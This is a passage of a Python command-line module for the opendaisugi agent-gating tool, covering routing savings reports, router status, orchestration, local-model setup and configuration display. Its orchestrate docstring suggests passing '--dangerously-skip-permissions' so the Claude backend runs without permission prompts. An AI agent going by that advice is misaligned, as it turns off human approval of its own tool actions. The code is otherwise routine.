    reuse COULD additionally save (a ceiling — every repeat-after-the-first served from a
    perfect, fresh cache, which nothing here does yet), and the two combined. Tokens
    first, dollars alongside. LLM-free except for the same one embed call
    `distill-repeats` uses to cluster repeats (requires the [search] extra).
    """
    from opendaisugi.gateway_journal import GatewayJournal
    from opendaisugi.gateway_report import (
        build_report,
        build_target_share_table,
        format_target_share_table,
    )

    journal_path = data_dir / "gateway" / "turns.jsonl"
    records = GatewayJournal(path=journal_path).load()
    if not records:
        typer.echo("no turns recorded yet — run `daisugi gateway` to start journaling.")
        return

    # The share table needs no embedder, so it prints before the reuse
    # sections that do.
    share = build_target_share_table(records)
    if share:
        typer.echo("Switchyard targets, measured. Each turn is booked by the target it names:")
        for line in format_target_share_table(share):
            typer.echo(line)
        typer.echo("")

    try:
        report = build_report(records)
    except ImportError as e:
        typer.echo(str(e), err=True)
        raise typer.Exit(code=2) from e

    typer.echo("Routing (realized) — measured from turns already run:")
    typer.echo(f"  turns:                 {report.turns}")
    typer.echo(f"  downgraded turns:      {report.downgraded_turns}")
    typer.echo(f"  frontier tokens saved: {report.routing_frontier_tokens_saved:,}")
    typer.echo(f"  dollars saved:         ${report.routing_dollars_saved:.2f}")
    typer.echo(f"  blended multiplier:    {report.routing_multiplier:.2f}x")
    typer.echo(f"  local-rung turns:      {report.local_turns}")
    typer.echo("")
    typer.echo("Prompt cache (measured) — the provider's own usage split:")
    typer.echo(f"  cache read tokens:     {report.cache_read_tokens:,}")
    typer.echo(f"  cache write tokens:    {report.cache_creation_tokens:,}")
    typer.echo(f"  cache hit rate:        {report.cache_hit_rate:.1%} of all input")
    typer.echo("")
    typer.echo("Reuse opportunity (ceiling) — NOT measured, assumes perfect fresh reuse:")
    typer.echo(f"  repeat clusters:       {report.repeat_clusters}")
    typer.echo(f"  recoverable tokens:    {report.reuse_recoverable_tokens:,}")
    typer.echo(f"  recoverable dollars:   ${report.reuse_recoverable_dollars:.2f}")
    typer.echo("")
    typer.echo("Combined (ceiling) — realized routing plus the reuse ceiling above:")
    typer.echo(f"  frontier tokens saved: {report.combined_frontier_tokens_saved:,}")
    typer.echo(f"  blended multiplier:    {report.combined_multiplier:.2f}x")
    typer.echo("")
    typer.echo(
        "note: the Reuse and Combined figures are a CEILING, assuming every repeat-after-"
        "the-first is served from a perfect, fresh cache — only Routing above is measured."
    )


@router_app.command("status")
def router_status_cmd(
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Show the router choice, the Switchyard binary, each running child, and recent turns.

    Each child is read from its own state file, <data-dir>/gateway/switchyard-PORT.json.
    A child whose pid is gone, or is no longer switchyard-server, is shown
    as a stale state file. Health is probed on the host and port each running
    child uses. Who pays is the record the gateway wrote at start, from the
    per-port config copy that child loaded. Recent turns
    and target shares come from the gateway's own turn journal.
    """
    from opendaisugi import router_switchyard as sy
    from opendaisugi.config import load_config
    from opendaisugi.gateway_journal import GatewayJournal
    from opendaisugi.gateway_report import build_target_share_table, format_target_share_table

    cfg = load_config(data_dir / "config.yaml")
    binary = sy.locate_binary()
    version = sy.binary_version() if binary else None
    children = []
    unreadable = []
    for path, state in sy.list_states(data_dir):
        if state is None:
            unreadable.append(str(path))
            continue
        auth = state.get("auth")
        running = sy.child_is_running(state["pid"])
        children.append(
            {
                "pid": state["pid"],
                "host": state["host"],
                "port": state["port"],
                "running": running,
                "healthy": running and sy.probe_health(state["host"], state["port"]),
                "config_path": state.get("config_path"),
                "route_id": state.get("route_id") or cfg.switchyard_route_id,
                "auth": auth if isinstance(auth, dict) else None,
                "state_file": str(path),
            }
        )
    targets = sy.targets_from_config(cfg)
    next_auth = sy.client_auth_modes(targets) if targets else None
    records = GatewayJournal(path=data_dir / "gateway" / "turns.jsonl").load()
    recent = [r for r in records if r.tier == "tier-switchyard"][-10:]
    share = build_target_share_table(records)

    if json_output:
        typer.echo(
            json.dumps(
                {
                    "router": cfg.gateway_router,
                    "binary": binary,
                    "version": version,
                    "children": children,
                    "unreadable_state_files": unreadable,
                    "next_start_auth": next_auth,
                    "targets": [asdict(row) for row in share],
                    "recent_turns": [
                        {"task": r.task, "model": r.model, "downgraded": r.downgraded}
                        for r in recent
                    ],
                }
            )
        )
        return

    typer.echo(f"configured router: {cfg.gateway_router}")
    typer.echo(f"  binary:  {binary or 'not found. Install it with: ' + sy.INSTALL_CMD}")
    if version:
        typer.echo(f"  version: {version}")
    live = [c for c in children if c["running"]]
    if live:
        typer.echo("running router: switchyard")
    for child in children:
        if not child["running"]:
            typer.echo(
                f"  stale state file: {child['state_file']}. Pid {child['pid']} is not a running "
                "switchyard-server. Clear it with: daisugi router stop"
            )
    for child in live:
        status = "healthy" if child["healthy"] else "not answering"
        typer.echo(
            f"  child:   pid {child['pid']} on {child['host']}:{child['port']}, {status}, "
            f"route {child['route_id']}"
        )
        typer.echo(f"    config: {child['config_path']}")
        if child["auth"]:
            typer.echo(f"    capable auth:   {child['auth']['capable']}")
            typer.echo(f"    efficient auth: {child['auth']['efficient']}")
        else:
            typer.echo("    auth: not recorded at start")
    if not live:
        typer.echo("  child:   not running. Start it with: daisugi gateway --router switchyard")
        if next_auth:
            typer.echo(f"  capable auth at next start:   {next_auth['capable']}")
            typer.echo(f"  efficient auth at next start: {next_auth['efficient']}")
    for path in unreadable:
        typer.echo(
            f"  unreadable state file: {path}. Remove it by hand, or run daisugi router stop."
        )
    if share:
        typer.echo("  targets:")
        for line in format_target_share_table(share):
            typer.echo(f"  {line}")
    typer.echo(f"  recent turns, last {len(recent)}:")
    for r in recent:
        label = " ".join(r.task.split())[:60]
        saved = "saving" if r.downgraded else "no saving"
        typer.echo(f"    {label!r:62}  {r.model}  {saved}")


@router_app.command("stop")
def router_stop_cmd(
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
) -> None:
    """Stop every switchyard-server that a gateway started and left running.

    A gateway stops its own child when it exits, and on Linux the kernel stops
    the child when its gateway is killed. Use this for what is left. A pid
    gets a signal only when its command line still names switchyard-server.
    """
    from opendaisugi.router_switchyard import list_states, stop_switchyard

    states = list_states(data_dir)
    if not states:
        typer.echo("no switchyard-server state file; nothing to stop")
        return
    for path, _state in states:
        typer.echo(stop_switchyard(path, wait_s=5.0))


@app.command("viz", hidden=True)
def viz_cmd(
    pathway_id: str = typer.Argument(
        None, help="Pathway id to visualize. Omit to list distilled pathways."
    ),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory (pathway store)."
    ),
    output: Path = typer.Option(
        None, "-o", "--output", help="Write the HTML here (default: <pathway_id>.html)."
    ),
) -> None:
    """Render a distilled pathway's plan as a standalone execution-monitor page.

    Produces a self-contained HTML file (all CSS/JS inline, no external fetches):
    the plan's dependency waves, per-step model sizing, and any step the
    envelope refuses — with its proven reason. Pure view; no LLM call, no writes
    beyond the output file.
    """
    from opendaisugi.pathway_store import PathwayStore
    from opendaisugi.viz import render_dag_html

    db = data_dir / "pathways.db"
    if not db.exists():
        typer.echo(
            f"No pathway store at {db}. Run `daisugi onboard` or `daisugi tend` first.",
            err=True,
        )
        raise typer.Exit(code=1)
    store = PathwayStore(db)

    if not pathway_id:
        rows = store.list_all()
        if not rows:
            typer.echo("No pathways distilled yet. Run `daisugi onboard` or `daisugi tend`.")
            return
        typer.echo(f"{len(rows)} pathway(s) — pass an id to `daisugi viz`:")
        for p in rows:
            typer.echo(f"  {p.id}  {p.task_description[:64]}")
        return

    pathway = store.get(pathway_id)
    if pathway is None:
        typer.echo(f"No pathway {pathway_id!r} in {db}. Run `daisugi viz` to list.", err=True)
        raise typer.Exit(code=1)

    # Title the page with the distilled task description (the pathway's envelope
    # may carry a terse per-trace task label from its source runs).
    envelope = pathway.envelope.model_copy(update={"task": pathway.task_description})
    html = render_dag_html(pathway.plan_template, envelope)
    out = output or Path(f"{pathway_id}.html")
    out.write_text(html, encoding="utf-8")
    typer.echo(f"Wrote {out} ({len(html)} bytes) — open it in a browser.")


@app.command("orchestrate", rich_help_panel="Run")
def orchestrate_cmd(
    prompt: str = typer.Argument(..., help="The prompt to run end to end."),
    envelope_path: "Path | None" = typer.Option(
        None,
        "--envelope",
        "-e",
        help="Envelope YAML (authorization boundary). If omitted, one is generated for the prompt.",
    ),
    budget: "int | None" = typer.Option(
        None,
        "--budget",
        "-b",
        help="Approximate token budget for the run (gates routing during execution). Omit for unbudgeted.",
    ),
    strict_budget: bool = typer.Option(
        False,
        "--strict-budget",
        help="Stop when the budget is exhausted instead of downgrading to a cheaper "
        "model. Note: --budget bounds mid-plan STEP ROUTING only — decompose and "
        "synthesis are overhead, outside it, so it is not a total-spend cap; and "
        "because a step's spend is counted before the check, this stops the NEXT "
        "step after the budget is crossed. No effect without --budget.",
    ),
    deterministic_synthesis: bool = typer.Option(
        False,
        "--deterministic-synthesis",
        help="Assemble the final answer from step outputs deterministically instead of "
        "with an LLM. On a reused distilled pathway (decompose skipped, shell/file/"
        "network steps run without inference) this is a fully inference-free run.",
    ),
    max_parallel: int = typer.Option(
        1,
        "--max-parallel",
        help="Run independent steps in the same dependency level concurrently, up to "
        "this many at once (1 = sequential, the default). Deterministic steps "
        "(shell/file/network) always qualify; LLM task steps qualify only when the "
        "run is unbudgeted (omit --budget), where model choice is order-independent.",
    ),
    model: str = typer.Option(
        "anthropic/claude-sonnet-4-20250514",
        "--model",
        help="Model used to decompose the prompt (and generate the envelope if none is given).",
    ),
    llm: str | None = typer.Option(
        None,
        "--llm",
        help="LLM backend: litellm | claude-code. Default: auto-detect.",
    ),
    stakes: str = typer.Option(
        "medium", "--stakes", help="Stakes for a generated envelope: low|medium|high."
    ),
    cost: bool = typer.Option(
        False,
        "--cost",
        help="Show a cost figure for the run — exact on the claude-code backend "
        "(Claude Code's own accounting), estimated on litellm. Off by default.",
    ),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data dir (pathway store + journal)."
    ),
    json_output: bool = typer.Option(
        False, "--json", help="Emit the orchestration result as JSON."
    ),
) -> None:
    """Run PROMPT end to end: decompose → size → supervised execute → synthesize.

    The decomposed plan is verified against the envelope before it runs and each
    step is re-verified at execution time; each step routes to the cheapest capable
    model within the token budget. Repeat prompts may reuse a distilled pathway.

    With ``--llm claude-code``, forward extra flags to every ``claude -p`` call via
    the ``DAISUGI_CLAUDE_ARGS`` env var — e.g.
    ``DAISUGI_CLAUDE_ARGS='--dangerously-skip-permissions'`` so the backend can act
    without an interactive permission prompt (which otherwise makes steps fail).
    """
    from opendaisugi import Daisugi, console
    from opendaisugi.exceptions import DecompositionError, NoStepsError, OpenDaisugiError

    if stakes not in _VALID_STAKES:
        typer.echo(f"Invalid --stakes {stakes!r}; choose from {sorted(_VALID_STAKES)}.", err=True)
        raise typer.Exit(code=2)
    if llm is not None and llm not in {"litellm", "claude-code"}:
        typer.echo(f"Invalid --llm value {llm!r}. Must be 'litellm' or 'claude-code'.", err=True)
        raise typer.Exit(code=2)
    if llm is not None:
        os.environ["OPENDAISUGI_LLM_BACKEND"] = llm
    _echo_resolved(data_dir)

    envelope = None
    if envelope_path is not None:
        try:
            envelope = Envelope(**yaml.safe_load(envelope_path.read_text()))
        except FileNotFoundError:
            _fail(
                f"Tried to read the envelope {envelope_path}.",
                "The file does not exist.",
                "Check the path.",
                code=2,
            )
        except (yaml.YAMLError, ValueError) as e:
            _fail(
                f"Tried to read the envelope {envelope_path}.",
                f"It did not parse: {str(e).splitlines()[0]}",
                "Fix the file and run again.",
                code=2,
            )

    d = Daisugi(model=model, data_dir=data_dir)
    try:
        with console.step("orchestrating"):
            result = asyncio.run(
                d.orchestrate(
                    prompt,
                    envelope=envelope,
                    budget_tokens=budget,
                    stakes=stakes,
                    strict_budget=strict_budget,
                    synth_llm=not deterministic_synthesis,
                    max_parallel=max_parallel,
                )
            )
    except NoStepsError:
        if json_output:
            typer.echo(json.dumps({"status": "no-steps", "prompt": prompt}))
        else:
            typer.echo("This prompt has no steps to run.")
            typer.echo(
                "daisugi orchestrate runs multi-step tasks under a verified envelope. "
                "For a plain question, ask your agent directly."
            )
        raise typer.Exit(code=0)
    except DecompositionError as e:  # DAG/policy/LLM-call failure, not zero-steps
        _fail(
            "Tried to decompose the prompt into a plan.",
            str(e),
            "Rephrase the prompt, or check the backend with `daisugi config`.",
        )
    except EnvelopeGenerationError as e:
        _fail("Tried to generate the envelope.", str(e), "Check the backend with `daisugi config`.")
    except OpenDaisugiError:  # already a three-part message; let main() render it
        raise
    except Exception as e:  # noqa: BLE001 — anything else is our bug
        _fail(
            "Tried to orchestrate the prompt.",
            f"{type(e).__name__}: {e}",
            "Run again with DAISUGI_DEBUG=1 and file the traceback as a bug.",
        )

    if json_output:
        payload = {
            "prompt": result.prompt,
            "status": result.status,
            "final_answer": result.final_answer,
            "reused_pathway": result.reused_pathway,
            "used_llm_synthesis": result.used_llm_synthesis,
            "budget": asdict(result.budget),
            "sizings": [asdict(s) for s in result.sizings],
            "steps": [
                {"step_id": s.step_id, "status": s.status, "rc": s.rc, "error": s.error}
                for s in result.session.steps
            ],
            "plan": result.plan.model_dump(mode="json"),
        }
        typer.echo(json.dumps(payload, indent=2, default=str))
    else:
        typer.echo(result.final_answer)
        typer.echo("")
        typer.echo(
            f"— orchestration ({result.status}"
            + (", reused pathway" if result.reused_pathway else "")
            + ") —"
        )
        # When the run didn't succeed, say WHY — otherwise the reader sees a final
        # answer plus a bare "failed" with no explanation (common cause: the
        # claude -p backend couldn't get tool permission; see DAISUGI_CLAUDE_ARGS).
        if result.status != "succeeded":
            for s in result.session.steps:
                if s.status in ("failed", "aborted", "rejected_halted") and s.error:
                    typer.echo(f"  {s.step_id}: {s.status} — {s.error}", err=True)
        for s in result.sizings:
            typer.echo(
                f"  {s.step_id}: difficulty={s.difficulty:.2f} → {s.tier} ({s.model})"
                + ("  [downgraded]" if s.downgraded else "")
            )
        b = result.budget
        spent = f"{b.spent}" + (f"/{b.total}" if b.total is not None else "")
        typer.echo(f"  budget: {spent} tokens across {b.step_count} model call(s)")
        if cost:
            if b.measured_cost_usd is not None:
                typer.echo(f"  cost:   ${b.measured_cost_usd:.4f} (exact — Claude Code accounting)")
            else:
                typer.echo(f"  cost:   ~${b.approx_cost_usd:.4f} (estimated)")

    if result.status != "succeeded":
        raise typer.Exit(code=1)


@app.command("models", hidden=True)
def models_cmd(
    repo: str = typer.Argument(
        None,
        help="Trusted HF repo to resolve+pin (e.g. mozilla-ai/Qwen2.5-0.5B-Instruct-llamafile). Omit to discover.",
    ),
    suffix: str = typer.Option(
        ".llamafile", "--suffix", help="File suffix to resolve (.llamafile or .gguf)."
    ),
    pull: bool = typer.Option(
        False, "--pull", help="Download the resolved file (pinned to its commit)."
    ),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Discover or resolve a trustworthy, commit-pinned local model from the Hub.

    No repo → list trusted llamafile repos. With a repo → resolve it to a pinned
    reference (trusted-org allowlist + list-first, never a guessed filename);
    --pull downloads it at the pinned commit.
    """
    from opendaisugi import model_registry as mr

    if repo is None:
        repos = mr.discover_llamafiles()
        if json_output:
            typer.echo(json.dumps({"trusted_repos": repos}, indent=2))
            return
        typer.echo(f"Trusted llamafile repos on the Hub ({len(repos)}):")
        for r in repos:
            typer.echo(f"  {r}")
        typer.echo("\nResolve one to a pinned ref:  daisugi models <repo-id>")
        return

    try:
        ref = mr.resolve_pinned(repo, suffix=suffix)
    except (mr.UntrustedSource, mr.NoMatchingFile) as exc:
        typer.echo(str(exc), err=True)
        raise typer.Exit(code=2)

    path = None
    if pull:
        path = mr.download_pinned(ref, allow_download=True)

    if json_output:
        typer.echo(
            json.dumps(
                {
                    "repo_id": ref.repo_id,
                    "filename": ref.filename,
                    "revision": ref.revision,
                    "downloaded_path": path,
                },
                indent=2,
            )
        )
        return
    typer.echo(f"repo:     {ref.repo_id}")
    typer.echo(f"file:     {ref.filename}")
    typer.echo(f"revision: {ref.revision}   (immutable commit — reproducible)")
    if path:
        typer.echo(f"pulled:   {path}")
    else:
        typer.echo("\nDownload it (pinned):  daisugi models {} --pull".format(repo))


@app.command("start", rich_help_panel="Start here")
def start_cmd(
    enforce: bool = typer.Option(
        False, "--enforce", help="Install the gate in enforce mode (default: shadow)."
    ),
    ask: bool = typer.Option(
        False,
        "--ask",
        help="Let the gate hand a would-deny to a present operator instead of denying "
        "outright. Needs --enforce — shadow mode never denies, so there is nothing to ask.",
    ),
    no_ui: bool = typer.Option(False, "--no-ui", help="Do the setup, do not open the view."),
    dry_run: bool = typer.Option(
        False, "--dry-run", help="Show the steps and their state; change nothing."
    ),
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
) -> None:
    """Get a gated session over this directory and watch it. One command, four steps.

    1. find the harness (Claude Code)  2. install the gate hook, scoped to this
    directory only — never a machine-global hook (shadow by default)
    3. register a starter envelope keyed to this directory  4. start the
    resident gate, then open the multi-session view. Run it again any time:
    it skips what is already done.
    """
    from opendaisugi import console
    from opendaisugi.start import StartOptions, plan_start, run_start

    if ask and not enforce:
        _fail(
            "the --ask flag only matters in --enforce mode.",
            "in shadow mode nothing is ever denied, so there is nothing to ask about.",
            "pass --enforce --ask together, or drop --ask.",
            code=2,
        )

    opts = StartOptions(cwd=Path.cwd(), data_dir=data_dir, enforce=enforce, ask=ask, no_ui=no_ui)
    steps = plan_start(opts) if dry_run else run_start(opts)
    width = max(len(s.key) for s in steps)
    for s in steps:
        console.say(f"  {s.key:<{width}}  {s.state:<7}  {s.text}")
    if any(s.state == "failed" for s in steps):
        raise typer.Exit(code=1)
    if dry_run or no_ui:
        return
    view = next(s for s in steps if s.key == "view")
    if "--tui" in view.text:
        from opendaisugi.tui import run_tui

        console.note("opening the multi-session view…")
        run_tui(data_dir)
    else:
        from opendaisugi.dashboard import run_live

        console.note("opening the live view…")
        run_live(data_dir)


@tiers_app.command("setup")
def setup_cmd(
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    endpoint: str = typer.Option(
        None,
        "--endpoint",
        help="OpenAI-compatible local /v1 URL to qualify (e.g. http://localhost:8080/v1).",
    ),
    remote: str = typer.Option(
        None,
        "--remote",
        help="host[:port] of a self-hosted model server to probe and record, on Tailscale "
        "or the LAN. Example: --remote gpu-box:11434.",
    ),
    kind: str = typer.Option(
        "auto",
        "--kind",
        help="auto | ollama | openai | anthropic. The wire --remote speaks. "
        "auto probes in order and stops at the first one that answers.",
    ),
    context: int = typer.Option(
        None,
        "--context",
        help="Override the probed context window in tokens. Example: --context 32768.",
    ),
    model: str = typer.Option(None, "--model", help="Model name served by --endpoint or --remote."),
    threshold: float = typer.Option(
        0.8, "--threshold", help="Min valid-envelope pass rate to promote."
    ),
    repeats: int = typer.Option(1, "--repeats", help="Sample each probe task N times."),
    wire: bool = typer.Option(False, "--wire", help="Persist the model as Tier-1 if it qualifies."),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Detect hardware, recommend a local model, and optionally qualify and wire it.

    With no --endpoint or --remote: prints the hardware profile, a size-appropriate
    llamafile recommendation, and the commands to get a local server running. With
    --endpoint and --model: runs the qualification gate against the live model and,
    with --wire, persists it as Tier-1 only if it clears the pass-rate threshold.
    With --remote: probes a self-hosted model server and records it as the
    operator's model host. That has nothing to do with local hardware sizing, so
    it skips straight to the probe.
    """
    from opendaisugi.hardware import detect_hardware, recommend_model
    from opendaisugi.local_setup import qualify_local_model, write_tier1_config

    if endpoint and remote:
        _fail(
            "--endpoint and --remote are mutually exclusive.",
            "--endpoint qualifies a local /v1 server against the envelope-generation "
            "gate. --remote probes and records a model host for your harness to point at.",
            "run one at a time: --endpoint URL --model NAME, or --remote HOST[:PORT].",
            code=1,
        )

    if remote:
        from opendaisugi.exceptions import ModelHostUnknownError
        from opendaisugi.model_host import describe_host, parse_remote, probe, record

        try:
            host, port = parse_remote(remote)
            info = probe(host, port, kind=kind)
        except ImportError as exc:
            _fail(
                str(exc),
                "the remote probe needs an HTTP client.",
                "run: uv add 'opendaisugi[gateway]'",
                code=1,
            )
        except ValueError as exc:
            _fail(
                str(exc),
                "--remote takes a bare HOST[:PORT], and --kind takes one of the listed wires.",
                "run: daisugi tiers setup --remote HOST[:PORT] --kind auto",
                code=1,
            )
        try:
            cfg = record(
                info,
                model=model,
                context_window=context,
                config_path=data_dir / "config.yaml",
            )
        except ModelHostUnknownError as exc:
            _fail(
                str(exc),
                "nothing was written. A recorded guess would poison the config.",
                "check that the host is reachable and serves Ollama, an OpenAI-compatible "
                "/v1, or an Anthropic-compatible /v1/messages. Or pass --kind explicitly.",
                code=3 if not info.reachable else 1,
            )
        for line in describe_host(info, cfg):
            typer.echo(line)
        return

    if endpoint and not model:
        typer.echo(
            "--model is required with --endpoint (the model name the local server serves).",
            err=True,
        )
        raise typer.Exit(code=2)

    profile = detect_hardware()
    rec = recommend_model(profile)

    qual = None
    wired = False
    if endpoint:
        from opendaisugi.tier1 import LiteLLMTier1Provider

        provider = LiteLLMTier1Provider(model=model, base_url=endpoint)
        qual = asyncio.run(qualify_local_model(provider, threshold=threshold, repeats=repeats))
        if qual.passed and wire:
            write_tier1_config(data_dir, model=model, base_url=endpoint)
            wired = True

    if json_output:
        payload = {
            "hardware": {
                "system": profile.system,
                "arch": profile.arch,
                "cpu_count": profile.cpu_count,
                "ram_gb": profile.ram_gb,
                "vram_gb": profile.vram_gb,
                "gpu_name": profile.gpu_name,
                "unified_memory": profile.unified_memory,
                "model_budget_gb": profile.model_budget_gb,
            },
            "recommendation": {
                "size_class": rec.size_class,
                "params_b_max": rec.params_b_max,
                "quant": rec.quant,
                "runtime": rec.runtime,
                "est_download_gb": rec.est_download_gb,
                "candidate_families": rec.candidate_families,
                "provisional": rec.provisional,
                "rationale": rec.rationale,
            },
            "qualification": None
            if qual is None
            else {
                "attempts": qual.attempts,
                "valid": qual.valid,
                "pass_rate": qual.pass_rate,
                "passed": qual.passed,
                "threshold": qual.threshold,
                "wired": wired,
            },
        }
        typer.echo(json.dumps(payload, indent=2))
        return

    typer.echo(
        f"Hardware: {profile.system}/{profile.arch}, {profile.cpu_count} CPU"
        + (f", {profile.ram_gb}GB RAM" if profile.ram_gb else ", RAM undetected")
        + (
            f", {profile.vram_gb}GB VRAM ({profile.gpu_name})"
            if profile.has_discrete_gpu
            else ", no discrete GPU"
        )
    )
    typer.echo(f"Model budget: ~{profile.model_budget_gb}GB")
    typer.echo("")
    typer.echo(
        f"Recommended: a {rec.size_class}-class instruct model at {rec.quant} "
        f"via {rec.runtime} (~{rec.est_download_gb}GB)."
    )
    typer.echo(
        f"  candidate families (your pick, none verified-best): {', '.join(rec.candidate_families)}"
    )
    typer.echo(f"  {rec.rationale}")
    typer.echo("")
    if qual is None:
        typer.echo("Get a local server running (one file, no install), then qualify + wire it:")
        typer.echo("  1. Find a trusted, commit-pinned model llamafile:  daisugi models")
        typer.echo(
            "     (canonical engine repo: github.com/mozilla-ai/llamafile; model org: huggingface.co/mozilla-ai)"
        )
        typer.echo("  2. Serve it:  ./<model>.llamafile --server --port 8080 --nobrowser")
        typer.echo(
            "  3. Qualify:   daisugi tiers setup --endpoint http://localhost:8080/v1 --model <name> --wire"
        )
    else:
        verdict = "PASSED" if qual.passed else "FAILED"
        typer.echo(
            f"Qualification: {verdict} — {qual.valid}/{qual.attempts} valid envelopes "
            f"(pass rate {qual.pass_rate:.0%}, threshold {qual.threshold:.0%})."
        )
        if wired:
            typer.echo(
                f"  → Wired as Tier-1 in {data_dir}; `daisugi onboard`/`tend` will now defer to it."
            )
        elif qual.passed and not wire:
            typer.echo("  → Passed. Re-run with --wire to persist it as Tier-1.")
        else:
            errored = sum(1 for _, kind in qual.outcomes if kind == "error")
            if errored == qual.attempts:
                typer.echo(
                    "  → ALL attempts errored — this is a wiring problem, not model capacity. "
                    "Check the server is reachable at --endpoint and serving /v1, and that "
                    "--model matches the name it serves."
                )
            else:
                typer.echo(
                    "  → Not promoted. Try a larger model, a higher quant, or lower --threshold deliberately."
                )


@app.command("setup", hidden=True)
def setup_moved_cmd() -> None:
    """Moved: `daisugi setup` is now `daisugi tiers setup` (same flags).

    A stub, not a redirect: `setup` and `tiers` aren't similar enough for
    Click's own "Did you mean" to bridge them, and the global rule here is
    that a removed command still points at its replacement.
    """
    _fail(
        "`daisugi setup` moved.",
        "hardware detection and local-model qualification now live under `tiers`.",
        "run: daisugi tiers setup",
        code=2,
    )


@app.command("status", rich_help_panel="Start here")
def status_cmd(
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    threshold: float | None = typer.Option(
        None,
        "--threshold",
        help="Pathway retrieval threshold to display; default: the active backend's.",
    ),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Show day-one readiness: are token savings live and are actions verified?"""
    from opendaisugi.onboarding import gather_status

    rep = gather_status(data_dir, threshold=threshold)

    if json_output:
        payload = dict(rep.__dict__)
        payload["data_dir"] = str(rep.data_dir)
        payload["token_savings_ready"] = rep.token_savings_ready
        payload["trust_ready"] = rep.trust_ready
        payload["shell_decomposition_ready"] = rep.shell_decomposition_ready
        typer.echo(json.dumps(payload, indent=2))
        return

    ok = "✓"
    no = "✗"
    typer.echo(f"opendaisugi status (data dir: {rep.data_dir})")
    typer.echo("")
    typer.echo("Token savings (pathway routing):")
    typer.echo(
        f"  {ok if rep.search_extra_installed else no} [search] extra "
        f"{'installed' if rep.search_extra_installed else 'MISSING — pathways disabled; install opendaisugi[search]'}"
    )
    typer.echo(f"  • compiled pathways: {rep.pathway_count} ({rep.pathway_hits} hits)")
    typer.echo(f"  • retrieval threshold: {rep.retrieval_threshold:.2f}")
    typer.echo(
        f"  → {ok + ' token savings are LIVE' if rep.token_savings_ready else no + ' not yet — run `daisugi onboard`'}"
    )
    typer.echo("")
    typer.echo("Trust (verified actions):")
    typer.echo(
        f"  • journal traces: {rep.journal_total} "
        f"({rep.journal_passed} verified, {rep.journal_failed} rejected)"
    )
    typer.echo("  • verification: strict at stakes high/physical (rejects unprovable invariants)")
    if not rep.shell_decomposition_enabled:
        typer.echo("  • compound shell (`a && b`): rejected outright (ADR-0010 opt-in is off)")
    elif rep.shell_decomposition_ready:
        typer.echo("  • compound shell (`a && b`): decomposed, every head allowlist-checked")
    else:
        typer.echo(
            f"  {no} compound shell: the opt-in is ON but the bash grammar is MISSING, "
            "so every compound command is denied — install it with: "
            "uv add 'opendaisugi[shell]'"
        )
    typer.echo(
        f"  → {ok + ' journal populated; replay any action with `daisugi journal replay <id>`' if rep.trust_ready else no + ' empty — run `daisugi onboard` or start capturing'}"
    )
    typer.echo("")
    typer.echo("Local model (Tier-1 — cheap envelope generation):")
    from opendaisugi.hardware import detect_hardware, recommend_model
    from opendaisugi.local_setup import load_configured_tier1

    configured = load_configured_tier1(data_dir)
    if configured is not None:
        typer.echo(
            f"  {ok} wired: {getattr(configured, 'model', '?')} @ {getattr(configured, 'base_url', 'default')}"
        )
        typer.echo("  → onboard/tend defer bulk envelope generation to your local model")
    else:
        prof = detect_hardware()
        rec = recommend_model(prof)
        typer.echo(
            f"  {no} none wired — hardware budget ~{prof.model_budget_gb:.0f}GB "
            f"→ recommends a {rec.size_class}-class model"
        )
        typer.echo("  → run `daisugi tiers setup` to pick, qualify, and wire a local model")


@app.command("config", rich_help_panel="Settings")
def config_cmd(
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Show every setting as daisugi will use it, and where each one came from.

    Sources: file (~/.opendaisugi/config.yaml), default, env, auto (detected),
    hook (an installed Claude Code gate hook's --mode). After plan 5's `daisugi
    start`, the winning hook may be a per-directory one, not the machine-global
    one `daisugi install --gate` writes — this reports BOTH the machine-global
    hook (~/.claude/settings.json) and the current directory's
    (./.claude/settings.json) when either or both exist, and the effective
    `gate_mode (resolved)` is whichever is stricter (both fire; an enforce
    anywhere denies), never just one of them read in isolation.
    """
    from opendaisugi.config import resolved_config, unknown_config_keys

    path = Path.home() / ".opendaisugi" / "config.yaml"
    fields = resolved_config(path)
    unknown = unknown_config_keys(path)
    if json_output:
        body = {f.key: {"value": f.value, "source": f.source} for f in fields}
        body["_meta"] = {"path": str(path), "unknown_keys_ignored": unknown}
        typer.echo(json.dumps(body, indent=2))
        return
    width = max(len(f.key) for f in fields)
    typer.echo(f"config file: {path}{'' if path.exists() else '  (not present)'}")
    for f in fields:
        typer.echo(f"  {f.key:<{width}}  {f.value}  ({f.source})")
    if unknown:
        typer.echo(f"  unknown keys ignored: {', '.join(unknown)}")


@app.command("bench", hidden=True)
def bench_cmd(
    layer: str = typer.Argument(..., help="A layer name, or 'pairs', or 'all'."),
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    corpus: Path = typer.Option(None, "--corpus", help="Read this corpus instead of the default."),
    live: bool = typer.Option(False, "--live", help="Run the real option, not the recorded one."),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Compare the options within one layer over a small committed corpus.

    Every table names the corpus it read and the command that reproduces it. An
    option that is not installed prints as absent with its install command.
    """
    from opendaisugi.bench.corpus import CorpusMissing
    from opendaisugi.bench.registry import BenchOpts, BenchRefused, layer_names, run_bench
    from opendaisugi.bench.table import render, to_dict, to_json

    names = layer_names()
    targets = names if layer == "all" else [layer]
    if layer != "all" and layer not in names:
        typer.echo(f"No bench for {layer!r}.", err=True)
        typer.echo(f"Layers: {', '.join(names)}, all.", err=True)
